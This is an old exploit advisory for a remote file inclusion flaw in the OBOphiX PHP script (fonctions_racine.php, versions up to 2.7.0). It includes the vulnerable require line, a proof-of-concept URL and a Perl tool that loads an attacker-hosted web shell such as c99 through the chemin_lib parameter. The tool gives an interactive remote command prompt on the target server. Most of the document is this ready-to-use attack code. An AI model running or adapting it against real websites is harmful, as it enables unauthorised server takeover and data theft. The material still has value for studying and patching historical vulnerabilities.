#[*] OBOphiX [fonctions_racine.php] <= 2.7.0 Remote File Include Vulnerability 


#[+] Author	        : EA Ngel
#[+] Location        : Manado - Indonesia
#[+] Situs           : www[dot]manadocoding[dot]net
#[+] Contact         : engelpemula@gmail.com
#[+] Download Script : http://biznetnetworks.dl.sourceforge.net/project/obophix/obophix/pack%20complet%20V1.0/lib.V1.zip


#[/] Dork            : cari sandiri jo neh <= :d


#[#] Bug             : require("$chemin_lib/config.inc.php");


#[^] 3xpl0it         : http://localhost/[path]/fonctions_racine.php?chemin_lib=[thanks.txt?]

                   
#[@] Special Thanks  : str0ke, basix, kamuiclone, Mr.C, cokiki, bl4ck_3n9in3, cyberlog, dbanie, fl3xu5, exnome
#                      g4pt3k, tonaas, doniskynet, rezagms, wishnu, my_wishdom, b0b0h0, jeckham, k3nz0, yadiyauri
#                      akiko, steve_san, steve_diving, moon_lee, c6, bibeh^pink, missi, luv13, 
#                      hyhgao, eyin, key, sansan and all friends


#[!] Greetz to0     : cr4wl3r is companions in arms and cpu monitor, keyboard, mouse <= :d
                     
#                     | gorontalodefacer[dot]org | sekuritionline[dot]net |


#[^] Note            : Jangan pernah malu untuk menjadi seorang pemula

#                      TUHAN MEMBERKATI  

# milw0rm.com [2009-09-09]





use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] OBOphiX [fonctions_racine.php] <= 2.7.0 Remote File Inclusion Exploit (II)\n\n";
	print "[x] Author: EA Ngel\n";
	print "[x] Email: engelpemula@gmail.com\n";
	print "[x] Website: www[dot]manadocoding[dot]net\n\n";
	print "[x] Location: Manado - Indonesia\n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/fonctions_racine.php?chemin_lib=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

